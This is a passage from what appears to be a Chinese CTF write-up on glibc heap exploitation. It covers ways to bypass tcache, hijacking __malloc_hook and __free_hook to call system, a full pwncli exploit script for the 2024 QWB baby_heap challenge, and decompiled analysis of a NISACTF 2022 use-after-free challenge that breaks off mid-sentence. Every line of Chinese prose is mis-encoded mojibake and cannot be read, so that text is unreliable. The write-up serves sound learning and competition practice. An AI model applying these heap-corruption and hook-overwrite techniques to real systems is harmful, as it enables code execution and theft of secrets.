¼ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è¿›è¡Œç»•è¿‡ã€‚</p><ul><li>é‡Šæ”¾ä¸åœ¨ tcache å¤§å°èŒƒå›´çš„<code>chunk</code>ã€‚</li></ul><p>tcacheä¸­æœ€å¤§<code>chunk</code>å¤§å°ä¸º0x410</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">add_chunk(<span class="hljs-number">0</span>,Â <span class="hljs-number">0x410</span>)<br>add_chunk(<span class="hljs-number">1</span>,Â <span class="hljs-number">0x10</span>)<br>delete_chunk(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><ul><li>é‡Šæ”¾ç›¸åŒå¤§å°çš„ chunk å°† tcache å¡«æ»¡</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#ç”³è¯·7ä¸ªç›¸åŒå¤§å°çš„chunkç”¨æ¥å¡«æ»¡tcache</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>add(i,<span class="hljs-number">0x68</span>)<br>    <br>add(<span class="hljs-number">7</span>, <span class="hljs-number">0x68</span>)<br><br><span class="hljs-comment">#é‡Šæ”¾7ä¸ªchunkå¡«æ»¡tcache</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    dele(i)<br><br>dele(<span class="hljs-number">7</span>)<br></code></pre></td></tr></table></figure><ul><li>å¦‚æœé¢˜ç›®é™åˆ¶äº† free æ¬¡æ•°é‚£ä¹ˆéœ€è¦é€šè¿‡ tcache dup å† malloc 3 æ¬¡å°† counts å¯¹åº”ä½ç½®ç½®ä¸º -1 æ¥ç»•è¿‡ tcache ã€‚</li></ul><p>å› ä¸ºcountsä¸º-1ï¼Œè½¬ä¸ºæ— ç¬¦å·æ•°åˆ™å¤§äºç­‰äº7æ‰€ä»¥é‡Šæ”¾çš„chunkä¸ä¼šå†è¿›å…¥tcacheã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">add_chunk(<span class="hljs-number">0</span>, <span class="hljs-number">0x68</span>)<br><br>delete_chunk(<span class="hljs-number">0</span>)<br>delete_chunk(<span class="hljs-number">0</span>)<br>add_chunk(<span class="hljs-number">0</span>, <span class="hljs-number">0x68</span>)<br>add_chunk(<span class="hljs-number">0</span>, <span class="hljs-number">0x68</span>)<br>add_chunk(<span class="hljs-number">0</span>, <span class="hljs-number">0x68</span>)<br><span class="hljs-comment">#è¿›å…¥fastbinçš„chunk</span><br>delete_chunk(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><ul><li>æ§åˆ¶ tcache_perthread_struct ä»è€Œæ§åˆ¶ counts å®ç°ç»•è¿‡ tcacheã€‚</li></ul><h2 id="hook"><a href="#hook" class="headerlink" title="hook"></a>hook</h2><h3 id="malloc-hook"><a href="#malloc-hook" class="headerlink" title="malloc_hook"></a>malloc_hook</h3><p>å¦‚æœ hook æœ‰å†…å®¹ï¼Œé‚£ä¹ˆæ‰§è¡Œhookçš„å†…å®¹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<br>__libc_malloc (<span class="hljs-type">size_t</span> bytes)<br>&#123;<br>  mstate ar_ptr;<br>  <span class="hljs-type">void</span> *victim;<br><br>  <span class="hljs-type">void</span> *(*hook) (<span class="hljs-type">size_t</span>, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *)<br>    = atomic_forced_read (__malloc_hook);<br>  <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>    <span class="hljs-keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="hljs-number">0</span>));<br></code></pre></td></tr></table></figure><p>gdb è°ƒè¯•æŸ¥çœ‹ä¸€ä¸‹ï¼ŒæŸ¥çœ‹<code>__malloc_hook</code>åœ°å€ã€‚</p><p><img src="/../../musl/assets/Pasted%20image%2020250411165402.png"></p><p>ç„¶åé€šè¿‡<code>tel</code>æŸ¥çœ‹åœ°å€ä¸Šæ˜¯å¦æœ‰å†…å®¹ï¼Œå¯ä»¥çœ‹åˆ°åœ°å€å†…å®¹ä¸ºç©ºã€‚</p><p><img src="/../../musl/assets/Pasted%20image%2020250411165442.png"></p><p>å¦‚æœè¿™ä¸ªåœ°å€å†…å®¹æ˜¯ä¸€ä¸ªå‡½æ•°æ¯”å¦‚<code>system</code>ï¼Œé‚£ä¹ˆè°ƒç”¨<code>malloc</code>å‡½æ•°å°±ä¼šæ‰§è¡Œ<code>system</code>å‡½æ•°ã€‚</p><h3 id="free-hook"><a href="#free-hook" class="headerlink" title="free_hook"></a>free_hook</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br>__libc_free (<span class="hljs-type">void</span> *mem)<br>&#123;<br>  mstate ar_ptr;<br>  mchunkptr p;                          <span class="hljs-comment">/* chunk corresponding to mem */</span><br>  <span class="hljs-comment">// è°ƒç”¨ __free_hook ï¼Œå‚æ•°æ˜¯æ˜¯å¦çš„å†…å­˜çš„åœ°å€ã€‚</span><br>  <span class="hljs-type">void</span> (*hook) (<span class="hljs-type">void</span> *, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *)<br>    = atomic_forced_read (__free_hook);<br>  <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>    &#123;<br>      (*hook)(mem, RETURN_ADDRESS (<span class="hljs-number">0</span>));<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>gdbè°ƒè¯•</p><p><img src="/../../musl/assets/Pasted%20image%2020250411165641.png"></p><p>æŸ¥çœ‹ free_hook åœ°å€ä¸Šçš„å†…å®¹</p><p><img src="/../../musl/assets/Pasted%20image%2020250411165755.png"></p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨hookä¸­å†™<code>system</code>å‡½æ•°ï¼Œå°†<code>malloc</code>å’Œ<code>free</code>å‡½æ•°ä¿®æ”¹ä¸ºæ‰§è¡Œ<code>system</code>å‡½æ•°ï¼Œæˆ‘ä»¬<code>malloc</code>æˆ–<code>free</code>ä¸€ä¸ªå­˜æœ‰<code>/bin/sh</code>çš„chunkæ—¢å¯ä»¥å®Œæˆgetshellã€‚æˆ–è€…æˆ‘ä»¬å¯ä»¥å°†hookä¿®æ”¹ä¸ºone_gadgetç›´æ¥getshellã€‚</p><h2 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><h3 id="2024-å¼ºç½‘æ¯-baby-heap"><a href="#2024-å¼ºç½‘æ¯-baby-heap" class="headerlink" title="2024 å¼ºç½‘æ¯ baby_heap"></a>2024 å¼ºç½‘æ¯ baby_heap</h3><blockquote><p>2024 å¼ºç½‘æ¯ baby_heap</p></blockquote><p>2.35 çš„å †ï¼Œè¿™é¢˜åªéœ€è¦æ‡‚å¾—åŸºæœ¬çš„åœ°å€æ³„éœ²å°±å¯ä»¥å®Œæˆã€‚</p><ul><li>åˆ†æ</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">â¯ baby_heap checksec ./pwn<br>    Arch:     amd64-64-little<br>    RELRO:    Full RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      PIE enabled<br></code></pre></td></tr></table></figure><p>åœ¨ç¨‹åºä¸­çš„<code>sub_1c99</code>å‡½æ•°ä¸­å‘ç°äº†ä»»æ„åœ°å€å†™æ¼æ´ï¼Œå³å°†<code>buf</code>å˜é‡çš„å†…å®¹ä½œä¸ºç›®æ ‡å†™å…¥åœ°å€ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">sub_1C99</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-keyword">if</span> ( dword_5068 )<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  sub_1616(<span class="hljs-string">&quot;Wow ! You find my secret shop !\n&quot;</span>);<br>  sub_1616(<span class="hljs-string">&quot;But ! It&#x27;s not so easy to get my secret \n&quot;</span>);<br>  sub_1616(<span class="hljs-string">&quot;  /\\_/\\  \n&quot;</span>);<br>  sub_1616(<span class="hljs-string">&quot; ( o.o ) \n&quot;</span>);<br>  sub_1616(<span class="hljs-string">&quot;  &gt; ^ &lt;  \n&quot;</span>);<br>  sub_1616(<span class="hljs-string">&quot;Input your target addr \n&quot;</span>);<br>  read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">8uLL</span>);<br>  sub_1C33();<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x10u</span>LL);<br>  <span class="hljs-keyword">return</span> ++dword_5068;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå¯¹èŒƒå›´è¿›è¡Œäº†é™åˆ¶</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">sub_1C33</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">void</span> *result; <span class="hljs-comment">// rax</span><br><br>  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">stdin</span> &lt;= buf &amp;&amp; &amp;<span class="hljs-built_in">stdin</span>[<span class="hljs-number">512</span>] &gt; buf )<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  result = buf;<br>  <span class="hljs-keyword">if</span> ( &amp;<span class="hljs-built_in">stdin</span>[<span class="hljs-number">-2206368</span>] &gt; buf )<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œé€šè¿‡<code>getenv</code>å‡½æ•°è·å–äº†ç¯å¢ƒå˜é‡ï¼Œå³ flag è—åœ¨ç¯å¢ƒå˜é‡ä¸­ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">sub_1D5D</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> *v0; <span class="hljs-comment">// rax</span><br><br>  v0 = getenv(<span class="hljs-string">&quot;USER&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( v0 )<br>    LODWORD(v0) = <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;USER = %s\n&quot;</span>, v0);<br>  <span class="hljs-keyword">return</span> v0;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå­˜åœ¨ä¸€ä¸ª UAF æ¼æ´ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡ UAF æ³„éœ²<code>libc</code>åŸºå€ï¼Œç„¶åå°†ä»»æ„åœ°å€ä¿®æ”¹ä¸º<code>puts</code>å‡½æ•°è¾“å‡º<code>environ</code>ä»è€Œè¾“å‡ºç¯å¢ƒå˜é‡ä¸­çš„ flagã€‚</p><ul><li>exp</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwncli <span class="hljs-keyword">import</span> *<br>cli_script()<br><br>io: tube = gift.io<br>elf: ELF = gift.elf<br>libc=ELF(<span class="hljs-string">&quot;./libc-2.35.so&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">malloc</span>(<span class="hljs-params">size</span>):<br>    sla(<span class="hljs-string">&#x27;: &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;e &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&#x27;: &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;: &#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&#x27;: &#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;: \n&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br>    ru(<span class="hljs-string">&#x27;here \n&#x27;</span>)<br><br>malloc(<span class="hljs-number">0x700</span>)<br>malloc(<span class="hljs-number">0x10</span>)<br>free(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">1</span>)<br>base=u64(r(<span class="hljs-number">8</span>))-<span class="hljs-number">0x21ace0</span><br>got=base+<span class="hljs-number">0x00000000021A118</span><br>sla(<span class="hljs-string">&#x27;: &#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>)<br>s(p64(got))<br>s(p64(base+libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]))<br>sla(<span class="hljs-string">&#x27;: &#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>)<br>sl(<span class="hljs-string">&#x27;2&#x27;</span>)<br><br>ia()<br></code></pre></td></tr></table></figure><h3 id="NISACTF-2022-UAF"><a href="#NISACTF-2022-UAF" class="headerlink" title="[[NISACTF 2022]UAF]"></a>[[NISACTF 2022]UAF]</h3><blockquote><p>[[NISACTF 2022]UAF]</p></blockquote><p>é¢˜å‹ï¼šå­˜åœ¨å‡½æ•°æŒ‡é’ˆ</p><ol><li>æŸ¥ä¿æŠ¤</li></ol><p>å‘ç°ä¸º32ä½ç¨‹åºï¼Œå¹¶ä¸”æ²¡æœ‰<code>PIE</code>ä¿æŠ¤ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">âœ  [NISACTF 2022]UAF checksec ./pwn<br>    Arch:     i386-32-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x8048000)<br></code></pre></td></tr></table></figure><ol start="2"><li>åˆ†æ</li></ol><p>åˆ†æ<code>main</code>å‡½æ•°</p><p>åˆ†æä¸»å‡½æ•°å‘ç°ä¸ºç»å…¸èœå•ç¨‹åºï¼Œé€šè¿‡é€‰æ‹©æ‰§è¡Œç›¸åº”çš„åŠŸèƒ½å‡½æ•°ã€‚</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬é€ä¸ªåŠŸèƒ½å‡½æ•°åˆ†æ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> input[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+8h] [ebp-10h] BYREF</span><br>  input[<span class="hljs-number">1</span>] = __readgsdword(<span class="hljs-number">0x14u</span>);<br>  setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>);<br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1.create&quot;</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2.edit&quot;</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3.delete&quot;</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;4.show&quot;</span>);<br>      <span class="hljs-built_in">putchar</span>(<span class="hljs-number">58</span>);<br>      __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, input);<br>      <span class="hljs-keyword">if</span> ( input[<span class="hljs-number">0</span>] != <span class="hljs-number">2</span> )<br>        <span class="hljs-keyword">break</span>;<br>      edit();<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( input[<span class="hljs-number">0</span>] &gt; <span class="hljs-number">2</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( input[<span class="hljs-number">0</span>] == <span class="hljs-number">3</span> )<br>      &#123;<br>        del();<br>      &#125;<br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( input[<span class="hljs-number">0</span>] == <span class="hljs-number">4</span> )<br>      &#123;<br>        show();<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>LABEL_13:<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid choice&quot;</span>);<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> ( input[<span class="hljs-number">0</span>] != <span class="hljs-number">1</span> )<br>        <span class="hljs-keyword">goto</span> LABEL_13;<br>      create();<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>é¦–å…ˆæˆ‘ä»¬æ¥åˆ†æ<code>create</code>å‡½æ•°ï¼Œå½“è¾“å…¥çš„æ•°å­—ä¸º1æ—¶æ‰§è¡Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">create</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// ebx</span><br>  <span class="hljs-type">char</span> *v2; <span class="hljs-comment">// eax</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;you are creating the %d page\n&quot;</span>, i);<br>  result = i;<br>  <span class="hljs-keyword">if</span> ( i &gt;= <span class="hljs-number">0</span> )<br>  &#123;<br>    result = i;<br>    <span class="hljs-keyword">if</span> ( i &lt;= <span class="hljs-number">9</span> )<br>    &#123;<br>      v1 = i;<br>      (&amp;page)[v1] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8u</span>);                 <span class="hljs-comment">// å›ºå®šç”³è¯·8å­—èŠ‚</span><br>      <span class="hljs-keyword">if</span> ( i )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( i &lt;= <span class="hljs-number">0</span> || i &gt; <span class="hljs-number">9</span> )<br>        &#123;<br>          <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;NO PAGE&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Good cretation!&quot;</span>);<br>          <span class="hljs-keyword">return</span> ++i;<br>        &#125;<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        v2 = page;<br>        *page = <span class="hljs-number">0x6F616967</span>;<br>        v2[<span class="hljs-number">4</span>] = <span class="hljs-number">0</span>;<br>        *(page + <span class="hljs-number">1</span>) = echo;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;The init page&quot;</span>);<br>        <span class="hljs-keyword">return</span> ++i;<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥åˆ†æ<code>del</code>å‡½æ•°</p><p>é€šè¿‡è¾“å…¥çš„æ•°å­—æ¥é‡Šæ”¾å¯¹åº”çš„<code>chunk</code>ï¼Œå¹¶ä¸”æ•°å­—ä¸èƒ½å¤Ÿå°äº0æˆ–å¤§äºiã€‚</p><p>æˆ‘ä»¬å°†<code>chunk</code>é‡Šæ”¾åï¼Œç”±äºæ²¡æœ‰å°†æŒ‡é’ˆç½®ä¸º<code>null</code>ï¼Œæ‰€ä»¥è¿™é‡Œå­˜åœ¨ä¸€ä¸ªUAFçš„æ¼æ´ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">del</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [esp+8h] [ebp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  v2 = __readgsdword(<span class="hljs-number">0x14u</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Input page&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v1);<br>  <span class="hljs-keyword">if</span> ( v1 &lt; <span class="hljs-number">0</span> || v1 &gt; i )<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;NO PAGE&quot;</span>);<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">free</span>((&amp;page)[v1]);                          <span class="hljs-comment">// freeåæ²¡æœ‰å°†æŒ‡é’ˆç½®ä¸ºnullï¼Œå­˜åœ¨uafæ¼æ´</span><br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14u</span>) ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥åˆ†æ<code>edit</code>å‡½æ•°</p><p>å‡½æ•°é€šè¿‡è¾“å…¥ç›¸åº”<code>chunk</code>çš„æ ‡å·æ¥é‡Šæ”¾<code>chunk</code>ï¼Œä½†æ˜¯å‰é¢æœ‰ä¸€ä¸ªæ£€æŸ¥ï¼Œå¦‚æœè¾“å…¥çš„æ ‡å·ç­‰äºé›¶æˆ–å¤§äº<code>i</code>åˆ™ä¸ä¼šæ‰§è¡Œä¿®æ”¹ç¨‹åºã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">edit</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [esp+8h] [ebp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  v2 = __readgsdword(<span class="hljs-number">0x14u</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Input page&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v1);<br>  <span class="hljs-keyword">if</span> ( v1 &lt;= <span class="hljs-number">0</span> || v1 &gt; i )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;NO PAGE&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Input your strings&quot;</span>);<br>    __isoc99_scanf(<span class="hljs-string">&quot;%s&quot;</span>, (&amp;page)[v1]);          <span class="hljs-comment">// ç¼–è¾‘pageçš„å†…å®¹ï¼Œå­˜åœ¨æ¼æ´</span><br>  &#125;<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14u</span>) ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ€åæˆ‘ä»¬åˆ†æ<code>show</code>å‡½æ•°</p><p>ç¨‹åºé€šè¿‡æ ‡å·æŸ¥çœ‹ç›¸åº”<code>chunk</code>çš„å†…å®¹ï¼Œä½†æ˜¯è¿™é‡Œæœ‰ä¸€ä¸ªéå¸¸å…³é”®çš„ç‚¹ã€‚</p><p>å¦‚æœæˆ‘ä»¬è¾“å…¥çš„æ 